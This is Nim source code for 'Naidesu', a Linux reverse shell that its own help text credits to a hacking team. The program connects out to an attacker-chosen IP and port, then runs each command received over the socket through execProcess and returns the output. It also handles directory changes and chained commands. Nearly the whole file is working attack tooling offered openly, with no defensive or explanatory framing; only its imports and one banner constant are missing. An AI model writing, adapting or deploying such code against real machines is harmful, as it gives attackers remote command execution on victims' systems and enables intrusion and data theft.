const help:   string = "Naidesu Reverse Shell in Nim for Linux - Written by patchmeifucan of Team Nyn Zyns\n      --ip= - IP Address of the Attacker machine\n      --port= - Port Number for Open Socket on Attacker machine\n      --help, -h - Displays this help menu again"
const home:   string = "~/"
const prompt: string = "[~] > "
const reply:  string = "[!] - "

proc check(key1: string, key2: string): int
proc kill(msg: string, exitcode: int)

type Naidesu = object
  ip:         string
  port:       int
  socket:     Socket

proc constructor(): Naidesu = 
  var parser: OptParser = initOptParser()
  result.socket = newSocket(AF_INET, SOCK_STREAM)

  case paramCount():
  of 0:
    result.ip = "127.0.0.1"
    result.port = 1337
  of 1:
    parser.next()
    case parser.key:
    of "help", "h": kill(help, QuitSuccess)
    of "ip":
      if parser.val == "":
        kill("No value provided, please provide a proper value to statement i.e. --ip=127.0.0.1", QuitFailure)
      else:
        result.ip = parser.val
        result.port = 1337
    of "port":
      if parser.val == "":
        kill("No value provided, please provide a proper value to statement i.e. --port=1337", QuitFailure)
      else:
        result.ip = "127.0.0.1"
        result.port = parseInt(parser.val)
    else: kill(fmt("Could not recognize input command {parser.val}"), QuitFailure)
  of 2:
    var
      keys: int = 0
      
      key1: string
      key2: string
      val1: string
      val2: string

    while keys < 2:
      parser.next()
      case keys
      of 0:
        key1 = parser.key
      else:
        key2 = parser.key
        if check(key1, key2) != 0: kill("Same argument has been provided twice, please use each argument only once", QuitFailure)

      case parser.key:
      of "help", "h": kill(help, QuitSuccess)
      of "ip":
        if parser.val == "":
          kill("No value provided, please provide a proper value to statement i.e. --ip=127.0.0.1", QuitFailure)
        else:
          val1 = parser.val
      of "port":
        if parser.val == "":
          kill("No value provided, please provide a proper value to statement i.e. --port=1337", QuitFailure)
        else:
          val2 = parser.val
      else: kill(fmt("Could not recognize input command {parser.val}"), QuitFailure)

      inc(keys)
    
    result.ip = val1
    result.port = parseInt(val2)
  else: kill("Too many input commands, please only provide --ip and/or --port", QuitFailure)

proc close(self: Naidesu) =
  send(self.socket, fmt("{reply}Closing connection\n"))
  close(self.socket)

proc connect(self: Naidesu) =
  try:
    self.socket.connect(self.ip, Port(self.port))
    send(self.socket, nyn)
    send(self.socket, fmt("{reply}Connection established\n"))
  except OSError:
    kill("Could not connect socket, listener not accessible", QuitFailure)

proc exec(self: Naidesu, input: string) = 
  var exec: string = execProcess(input)
  send(self.socket, fmt("{reply}{exec}\n"))

proc pathhandler(self: Naidesu, input: string) = 
  var dir = input[3..^1].strip()
  try:
    if dir == home:
      dir = getHomeDir()
    elif dir.startsWith(home):
      dir = fmt("{getHomeDir()}{dir[2..^1].strip()}")

    setCurrentDir(dir)
    send(self.socket, fmt("{reply}{dir}\n"))
  except OSError:
    send(self.socket, fmt("{reply}{dir} not found\n"))

proc splitcmds(self: Naidesu, input: string, escape: string) =
  var cmds: seq[string] = input.split(escape)

  for cmd in cmds:
    if cmd.startsWith("cd ") or cmd.startsWith(" cd"):
      self.pathhandler(cmd)
    else:
      self.exec(cmd)

proc shell(self: var Naidesu) =
  var input: string

  while true:
    send(self.socket, prompt)
    input = recvLine(self.socket)
    if cmpIgnoreCase(input, "exit") == 0:
      break
    elif cmpIgnoreCase(input, "naidesu") == 0:
      send(self.socket, nyn)
    elif input.startsWith("cd ") and input.contains("&&") or input.contains("&&") and input.contains(" cd"):
      self.splitcmds(input, "&&")
    elif input.startsWith("cd ") and input.contains(" ; ") or input.contains(" ; ") and input.contains(" cd"):
      self.splitcmds(input, " ; ")
    elif input.startsWith("cd "):
      self.pathhandler(input)
    else:
      self.exec(input)

proc check(key1: string, key2: string): int =
  if key1 == key2:
    return 1
  else:
    return 0

proc kill(msg: string, exitcode: int) =
  echo(msg)
  quit(exitcode)

proc main() =
  var naidesu: Naidesu = constructor()

  naidesu.connect()
  naidesu.shell()
  naidesu.close()

main()